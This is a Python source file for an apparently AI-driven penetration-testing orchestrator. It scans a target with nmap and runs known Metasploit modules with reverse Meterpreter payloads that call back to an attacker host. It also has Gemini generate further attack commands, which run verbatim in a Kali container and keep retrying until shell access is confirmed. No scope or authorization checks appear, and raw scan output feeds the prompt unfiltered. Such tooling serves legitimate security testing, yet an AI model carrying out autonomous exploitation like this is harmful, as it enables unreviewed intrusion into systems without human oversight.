import json
import re
import time
from typing import Callable, List, Optional

# from crewai import Crew, Task
from google import genai
from pydantic import BaseModel, Field

from app.agents.exploit_db import get_exploits_for_service
from app.agents.mission_exceptions import MissionCancelled  # noqa: F401 (re-export)
from app.agents.tester import get_tester_agent
from app.agents.tools import kali_lhost, kali_tool
from app.agents.usage import extract_usage
from app.core.config import settings


# Provider serving the manager/scanner LLM calls in this orchestrator.
_GEMINI_PROVIDER = "gemini"


class LLMResponseError(Exception):
    """The model returned something we could not parse as the expected JSON.

    Raised by `_generate` only after a repair attempt fails, so callers can
    degrade gracefully (skip a port, extract no services) instead of letting a
    single bad response fail the whole mission.
    """

# Evidence that a command actually achieved access/execution on the target.
_CONFIRM_PATTERNS = [
    r"session \d+ opened",
    r"meterpreter session \d+ opened",
    r"command shell session \d+ opened",
    r"\buid=\d+\(",                 # output of `id`/`whoami` with uid
    r"backdoor has been spawned",
    r"login successful",
    r"already exploited",           # vsftpd: backdoor port already open = confirmed
    r"code execution",
    r"authenticated",
    r"privilege escalation",
]


gemini_client = genai.Client()

# Gemini free tier allows ~15 requests/min per model. Stay safely under that with a
# client-side throttle, and retry on transient errors (429 rate limit, 503/500 server
# spikes) with backoff instead of letting them fail the mission. ~4.5s spacing => <14/min.
_MIN_SECONDS_BETWEEN_CALLS = 4.5
_MAX_RETRIES = 5
_last_call_ts = 0.0


class DiscoveredService(BaseModel):
    port: int
    service_name: str
    version: str


class InitialScanOutput(BaseModel):
    hosts_up: bool
    services: List[DiscoveredService]


class NextStepDecision(BaseModel):
    action: str = Field(
        description="Possible values:" \
        "'COMPLETED', 'SEARCH_EXPLOIT', 'EXECUTE_ATTACK', or 'NEXT_PORT'"
    )
    target_port: Optional[int]
    specific_command: Optional[str] = Field(
        description="Il comando esatto che il Tester deve eseguire sul terminale"
    )
    reasoning: str = Field(description="Perché il manager ha preso questa decisione")


class NoOpReporter:
    """Default sink: prints logs, persists nothing. Used when running standalone."""

    def log(self, step: str, message: str, status: str = "running") -> None:
        print(
            f"\n[TALOSAI_LOG] [{status.upper()}] {step} -> {message}", flush=True
        )

    def services_discovered(self, services: list) -> None:
        pass

    def finding(self, data: dict) -> None:
        pass

    def port_status(
        self, port: int, status: str, attempts: int, history: list
    ) -> None:
        pass

    def mission_status(self, status: str, error: Optional[str] = None) -> None:
        pass

    def record_usage(
        self,
        agent: str,
        model: str,
        provider: str,
        prompt_tokens: int,
        completion_tokens: int,
        total_tokens: int,
        latency_seconds: float,
    ) -> None:
        pass


class HybridOrchestratorV2:
    def __init__(
        self,
        target: str,
        user_prompt: Optional[str] = None,
        reporter=None,
        initial_services: Optional[List[dict]] = None,
        should_cancel: Optional[Callable[[], bool]] = None,
    ):
        self.target = target
        self.local_executor = get_tester_agent()
        self.user_prompt = (
            user_prompt or "Perform a comprehensive structural penetration test."
        )
        self.reporter = reporter or NoOpReporter()
        # When provided (resume), discovery is skipped and these per-port states
        # (each: port, service_name, version, status, attempts, history) are used.
        self.initial_services = initial_services
        # Cooperative cancellation: checked at safe checkpoints (between ports and
        # between attempts). A long in-flight command finishes before the stop takes.
        self._should_cancel = should_cancel or (lambda: False)

    def _emit_log(self, step_name: str, message: str, status: str = "running"):
        self.reporter.log(step_name, message, status)

    def _check_cancel(self) -> None:
        if self._should_cancel():
            raise MissionCancelled()

    @staticmethod
    def _with_lhost(command: str) -> str:
        """Inject `setg LHOST <kali_ip>` into msfconsole commands so reverse
        payloads always validate. The injected command is what gets stored in the
        finding too, so it stays copy-paste reproducible."""
        if "msfconsole" not in command or "LHOST" in command:
            return command
        ip = kali_lhost()
        if not ip:
            return command
        prefix = f"setg LHOST {ip}; "
        new, n = re.subn(
            r'(-x\s+)(["\'])', lambda m: m.group(1) + m.group(2) + prefix,
            command, count=1,
        )
        return new if n else command

    @staticmethod
    def _looks_confirmed(output: str) -> bool:
        """Best-effort: did the command show real access/execution evidence?"""
        text = output or ""
        return any(re.search(p, text, re.IGNORECASE) for p in _CONFIRM_PATTERNS)

    # Keep the TAIL of command output in history/findings: for msfconsole the
    # proof (session opened, `id` output) lands at the END, so slicing from the
    # start ([:N]) threw away exactly the evidence the LLM needs to see (#1).
    _OUTPUT_TAIL = 2500

    # Proof-of-exploitation commands run on the opened session, in order. Single
    # source of truth for both the deterministic exploit-first path and the
    # instructions given to the LLM, so every confirmed finding carries the same
    # evidence: who we are, our full identity/groups, and the target's kernel.
    _PROOF_COMMANDS = ("whoami", "id", "uname -a")

    @classmethod
    def _proof_clause(cls) -> str:
        """`sessions -c` clause running each proof command.

        One `sessions -c` per command, not a single chained string: msfconsole's
        -x splits console commands on ';', so chaining would break. Multi-token
        commands (e.g. 'uname -a') get single quotes, which pass through the
        outer double-quoted -x verbatim with no escaping.
        """
        parts = []
        for cmd in cls._PROOF_COMMANDS:
            parts.append(f"sessions -c '{cmd}'" if " " in cmd else f"sessions -c {cmd}")
        return "; ".join(parts)

    def _build_msf_command(self, module: str, payload: Optional[str], port: int) -> str:
        """Non-interactive, self-terminating msfconsole one-liner for a known module.

        Same shape the manager prompt asks the LLM to produce, so exploit-first
        attempts are copy-paste reproducible and look identical in findings.
        """
        opts = f"set RHOSTS {self.target}; set RPORT {port}; "
        if payload:
            opts += f"set PAYLOAD {payload}; "
        command = (
            f'msfconsole -q -x "use {module}; {opts}'
            f'run -z; {self._proof_clause()}; exit -y"'
        )
        return self._with_lhost(command)

    def _record_attempt(
        self,
        *,
        port: int,
        name: str,
        action: str,
        command: str,
        cmd_output: str,
        reasoning: str,
        history: List[dict],
        attempts: int,
    ) -> bool:
        """Append an attempt to history, persist the finding + port status.

        Returns whether the command looks confirmed, so the caller can decide to
        short-circuit (#2).
        """
        confirmed = self._looks_confirmed(cmd_output)
        history.append(
            {
                "command_sent": command,
                "terminal_output": cmd_output[-self._OUTPUT_TAIL:],
            }
        )
        self.reporter.finding(
            {
                "port": port,
                "service_name": name,
                "action": action,
                "command": command,
                "output": cmd_output[-4000:],
                "reasoning": reasoning,
                "confirmed": confirmed,
            }
        )
        self.reporter.port_status(port, "in_progress", attempts, history)
        return confirmed

    # def _execute_micro_task(
    #     self, command_to_run: str, expected_description: str
    # ) -> str:
    #     micro_task = Task(
    #         agent=self.local_executor,
    #         description=
    #         f"Execute this exact command inside Kali container: {command_to_run}. " \
    #         f"Context: {expected_description}",
    #         expected_output="The raw command-line stdout/stderr output.",
    #     )
    #     crew = Crew(tasks=[micro_task], agents=[self.local_executor], verbose=False)
    #     output = crew.kickoff()
    #     return output.raw if hasattr(output, "raw") else str(output)

    def _execute_micro_task(
            self, command_to_run: str, expected_description: str
        ) -> str:
        self._emit_log("Tester", f"Running directly via Docker: {command_to_run}")
        output = kali_tool._run(command=command_to_run)
        return output

    @staticmethod
    def _parse_retry_delay(message: str, fallback: float = 30.0) -> float:
        # Gemini surfaces the suggested wait either as "Please retry in 30.04s"
        # or as a RetryInfo "retryDelay": "30s" field. Honor whichever is present.
        for pattern in (r"retry in ([\d.]+)s", r"retryDelay'?:\s*'?(\d+(?:\.\d+)?)s"):
            match = re.search(pattern, message)
            if match:
                return float(match.group(1)) + 1.0  # small cushion
        return fallback

    @staticmethod
    def _loads_or_repair(text: Optional[str]) -> dict:
        """Parse model output as JSON, repairing a stray prose wrapper if needed.

        Raises LLMResponseError if nothing JSON-shaped can be recovered, so the
        caller can degrade gracefully rather than crashing the mission (#3).
        """
        if not text:
            raise LLMResponseError("empty model response")
        try:
            return json.loads(text)
        except (json.JSONDecodeError, TypeError):
            # Models occasionally wrap JSON in prose or code fences despite the
            # response schema. Recover the first {...} block as a best effort.
            cleaned = re.sub(r"```json|```", "", text)
            match = re.search(r"\{.*\}", cleaned, re.DOTALL)
            if match:
                try:
                    return json.loads(match.group())
                except json.JSONDecodeError:
                    pass
            raise LLMResponseError("model returned non-JSON output")

    def _generate(self, prompt: str, schema, agent: str, _retry: int = 0) -> dict:
        global _last_call_ts

        wait = _MIN_SECONDS_BETWEEN_CALLS - (time.monotonic() - _last_call_ts)
        if wait > 0:
            time.sleep(wait)

        try:
            started = time.monotonic()
            resp = gemini_client.models.generate_content(
                contents=prompt,
                model=settings.GEMINI_MODEL,
                config=genai.types.GenerateContentConfig(
                    response_mime_type="application/json",
                    response_schema=schema,
                ),
            )
            latency = time.monotonic() - started
            # Record usage the moment the call returns — before parsing — so the
            # tokens we spent are counted even if the body turns out unparseable.
            prompt_tokens, completion_tokens, total_tokens = extract_usage(
                resp, _GEMINI_PROVIDER
            )
            self.reporter.record_usage(
                agent=agent,
                model=settings.GEMINI_MODEL,
                provider=_GEMINI_PROVIDER,
                prompt_tokens=prompt_tokens,
                completion_tokens=completion_tokens,
                total_tokens=total_tokens,
                latency_seconds=latency,
            )
            return self._loads_or_repair(resp.text)
        except LLMResponseError:
            # Parsing failure: do NOT retry the network (we got a 200), just
            # bubble up so the caller can skip/degrade.
            raise
        except Exception as e:
            msg = str(e)
            is_rate_limit = "429" in msg or "RESOURCE_EXHAUSTED" in msg
            is_transient_server = (
                "503" in msg or "UNAVAILABLE" in msg
                or "500" in msg or "INTERNAL" in msg
            )
            if (is_rate_limit or is_transient_server) and _retry < _MAX_RETRIES:
                if is_rate_limit:
                    # 429 carries a precise retryDelay from Google; honor it.
                    delay = self._parse_retry_delay(msg)
                    reason = "rate limit (429)"
                else:
                    # 503/500 carry no retryDelay: exponential backoff 2,4,8,16,32..60s.
                    delay = min(2.0 * (2 ** _retry), 60.0)
                    reason = "transient server error (503/500)"
                self._emit_log(
                    "Manager",
                    f"Gemini {reason}; backing off {delay:.0f}s "
                    f"(retry {_retry + 1}/{_MAX_RETRIES})...",
                )
                time.sleep(delay)
                return self._generate(prompt, schema, agent, _retry=_retry + 1)
            raise
        finally:
            _last_call_ts = time.monotonic()

    def _discover_services(self) -> List[dict]:
        """Run nmap on all ports, parse it, and return per-port working state (fresh run)."""  # noqa: E501
        self._check_cancel()
        self._emit_log(
            "Manager",
            f"Starting comprehensive service discovery scan on {self.target}...",
        )
        raw_nmap_output = self._execute_micro_task(
            command_to_run=f"nmap -sV -sC -p- {self.target}",
            expected_description="Comprehensive service verification scan on all 65536 ports.",  # noqa: E501
        )

        self._emit_log("Manager", "Parsing raw Nmap output with Gemini...")
        parse_prompt = (
            "Analyze this raw Nmap output and extract all active "
            f"services:\n{raw_nmap_output}"
        )
        try:
            scan_data = self._generate(parse_prompt, InitialScanOutput, agent="scanner")
        except LLMResponseError as e:
            # Don't fail the whole mission over an unparseable parse response.
            self._emit_log(
                "Manager",
                f"Could not parse Nmap output ({e}); no services extracted.",
                "warning",
            )
            scan_data = {"services": []}

        services = [
            {
                "port": s["port"],
                "service_name": s["service_name"],
                "version": s["version"],
                "status": "pending",
                "attempts": 0,
                "history": [],
            }
            for s in scan_data.get("services", [])
        ]
        # Persist the port roster immediately so a crash right after discovery
        # still leaves a resumable mission.
        self.reporter.services_discovered(services)
        return services

    def run(self) -> dict:
        self._check_cancel()
        # Resume reuses the persisted roster; a fresh run (or a resume of a
        # mission that crashed before any port was saved) runs discovery.
        if self.initial_services:
            services = self.initial_services
        else:
            services = self._discover_services()

        self._emit_log(
            "Manager",
            f"Discovered {len(services)} services to investigate.",
            "completed",
        )

        for service in services:
            self._check_cancel()
            # Resume: ports already finished are skipped.
            if service.get("status") == "completed":
                continue

            port = service["port"]
            name = service["service_name"]
            version = service["version"]
            history_of_this_port = list(service.get("history") or [])
            attempts = int(service.get("attempts") or 0)

            self._emit_log(
                "Manager",
                f"Investigating Port {port} ({name} - Version: {version})...",
                "running",
            )
            self.reporter.port_status(
                port, "in_progress", attempts, history_of_this_port
            )

            port_completed = False
            known_exploits = get_exploits_for_service(name, version)

            # EXPLOIT-FIRST (#4): when we have high-confidence known modules for
            # this service, run them directly — no LLM round-trip — on a fresh
            # port. The manager LLM is consulted only if these don't land. Skipped
            # on resume (history already present) to avoid re-running attempts.
            if known_exploits and not history_of_this_port:
                self._emit_log(
                    f"Manager [Port {port}]",
                    f"Exploit-first: trying {len(known_exploits)} known module(s) "
                    "before consulting the LLM.",
                )
                for module, payload, desc in known_exploits:
                    self._check_cancel()
                    if attempts >= 5:
                        break
                    attempts += 1
                    command = self._build_msf_command(module, payload, port)
                    self._emit_log(
                        f"Tester [Port {port}]", f"Known exploit: {module} ({desc})"
                    )
                    cmd_output = self._execute_micro_task(
                        command_to_run=command,
                        expected_description=f"Known exploit on port {port}: {desc}",
                    )
                    confirmed = self._record_attempt(
                        port=port,
                        name=name,
                        action="EXECUTE_ATTACK",
                        command=command,
                        cmd_output=cmd_output,
                        reasoning=f"Exploit-first known module: {desc}",
                        history=history_of_this_port,
                        attempts=attempts,
                    )
                    # SHORT-CIRCUIT (#2): a confirmed session ends the port now.
                    if confirmed:
                        self._emit_log(
                            f"Manager [Port {port}]",
                            "Confirmed access via known exploit; closing port.",
                            "success",
                        )
                        port_completed = True
                        break

            while not port_completed and attempts < 5:
                self._check_cancel()
                attempts += 1

                exploit_hint = ""
                if known_exploits:
                    exploit_hint = "\n\nKNOWN EXPLOITS FOR THIS SERVICE (try these in order if automated discovery fails):\n"  # noqa: E501
                    for module, payload, desc in known_exploits:
                        exploit_hint += f"  - {module} (payload: {payload or 'default'}) - {desc}\n"  # noqa: E501

                manager_prompt = (
                    f"You are the Lead Pentester managing an attack loop against target {self.target}.\n"  # noqa: E501
                    f"Current Focus -> Port: {port}, Service: {name}, Version: {version}.\n"  # noqa: E501
                    f"What we tried so far on this port:\n{json.dumps(history_of_this_port, indent=2)}\n\n"  # noqa: E501
                    f"Decide the next step. If you found a vulnerability/access point or concluded it is not vulnerable, "  # noqa: E501
                    f"set action to 'NEXT_PORT' or 'COMPLETED'. Otherwise, provide the exact 'specific_command' for the tester.\n"  # noqa: E501
                    f"{exploit_hint}"
                    "\nRules for 'specific_command' (the tester runs it verbatim, and the pentester must be able to copy-paste it to reproduce the finding):\n"  # noqa: E501
                    "- Prefer Metasploit or target-specific automated tools over raw .py/.rb exploitdb scripts.\n"  # noqa: E501
                    "- The command MUST be non-interactive and self-terminating: it must NEVER leave an open shell or console (that hangs the run).\n"  # noqa: E501
                    "- For Metasploit, use exactly this shape:\n"
                    f"  msfconsole -q -x \"use <module>; set RHOSTS <ip>; set RPORT <port>; <other options>; run -z; {self._proof_clause()}; exit -y\"\n"  # noqa: E501
                    "    * 'run -z' opens the session in the background instead of dropping into an interactive shell.\n"  # noqa: E501
                    f"    * the proof clause runs these commands, in order, on the opened session: {', '.join(self._PROOF_COMMANDS)}. Use one 'sessions -c' per command (msfconsole splits -x on ';'), and single-quote any multi-token command (e.g. sessions -c 'uname -a').\n"  # noqa: E501
                    "    * always finish with 'exit -y' so msfconsole quits.\n"
                    "- RETRY STRATEGY: If your first attempt fails (no session, timeout, or silent failure), try a DIFFERENT exploit from the known list or a DIFFERENT payload. Keep retrying with variants until success or all options exhausted. Do NOT give up after one failure.\n"  # noqa: E501
                    "- Do NOT guess or hardcode a payload name. Let Metasploit use the module's DEFAULT payload (always compatible). If the default is non-interactive (e.g. cmd/unix/reverse_netcat), prefer to set a Meterpreter payload instead (e.g. php/meterpreter/reverse_tcp, cmd/linux/http/x86/meterpreter, linux/x86/meterpreter) to ensure interactive shell support and reliable proof commands. Do not hardcode LHOST unless required; let Metasploit auto-detect the local interface.\n"  # noqa: E501
                    f"- Proof of exploitation: ALWAYS run ALL of these proof commands in the sessions -c clause: {', '.join(self._PROOF_COMMANDS)}. If they fail silently, consider the exploit unconfirmed and try a different payload or approach on the next attempt.\n"  # noqa: E501
                )

                # Defensive parse (#3): an unparseable decision skips the port
                # instead of crashing the mission.
                try:
                    decision = self._generate(
                        manager_prompt, NextStepDecision, agent="manager"
                    )
                except LLMResponseError as e:
                    self._emit_log(
                        f"Manager [Port {port}]",
                        f"Unparseable LLM decision ({e}); moving to next port.",
                        "warning",
                    )
                    port_completed = True
                    continue

                action = decision.get("action")
                reasoning = decision.get("reasoning", "")
                self._emit_log(
                    f"Manager [Port {port}]",
                    f"Decision: {action} -> {reasoning}",
                )

                if action in ("NEXT_PORT", "COMPLETED") or action is None:
                    port_completed = True
                    continue

                command = decision.get("specific_command")
                if not command:
                    # Action asked for execution but gave no command: don't burn
                    # the attempt silently — log and let the next iteration retry.
                    self._emit_log(
                        f"Manager [Port {port}]",
                        f"Action '{action}' had no specific_command; skipping attempt.",
                        "warning",
                    )
                    continue

                # LHOST injected here so BOTH the executed command and the
                # stored finding command are identical and copy-paste runnable.
                command = self._with_lhost(command)
                cmd_output = self._execute_micro_task(
                    command_to_run=command,
                    expected_description=f"Testing vulnerability on port {port}",
                )
                confirmed = self._record_attempt(
                    port=port,
                    name=name,
                    action=action,
                    command=command,
                    cmd_output=cmd_output,
                    reasoning=reasoning,
                    history=history_of_this_port,
                    attempts=attempts,
                )
                # SHORT-CIRCUIT (#2): stop as soon as access is proven.
                if confirmed:
                    self._emit_log(
                        f"Manager [Port {port}]",
                        "Confirmed access; closing port without further LLM calls.",
                        "success",
                    )
                    port_completed = True

            service["status"] = "completed"
            service["attempts"] = attempts
            service["history"] = history_of_this_port
            self.reporter.port_status(
                port, "completed", attempts, history_of_this_port
            )
            self._emit_log(
                "Manager", f"Finished investigation on port {port}.", "success"
            )

        return {"status": "completed", "target": self.target, "services": len(services)}
